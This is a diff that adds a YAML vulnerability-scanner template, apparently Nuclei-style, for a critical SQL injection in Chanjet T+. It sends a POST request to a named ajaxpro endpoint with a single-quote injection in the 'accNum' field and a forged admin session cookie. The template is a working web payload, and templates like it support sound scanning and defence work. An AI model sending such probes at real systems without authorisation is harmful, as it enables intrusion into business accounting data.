@@ -1,0 +1,19 @@
+id: yaml-poc-chanjet-chanjet_t_plus-sql_injection-CT-753949
+info:
+  name: Yaml Poc Chanjet Chanjet_T_Plus Sql_Injection Ct 753949
+  author: yuxiang.cai
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-chanjet-chanjet_t_plus-sql_injection-CT-753949'
+  tags: sqli
+  reference: []
+http:
+- method: POST
+  path:
+  - /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex
+  body: '{"accNum": "{{rand}}''", "functionTag": "SYS0104", "url": ""}
+
+    '
+  headers:
+    Content-Type: text/plain
+    Cookie: ASP.NET_SessionId=; sid=admin
+    Host: 127.0.0.1
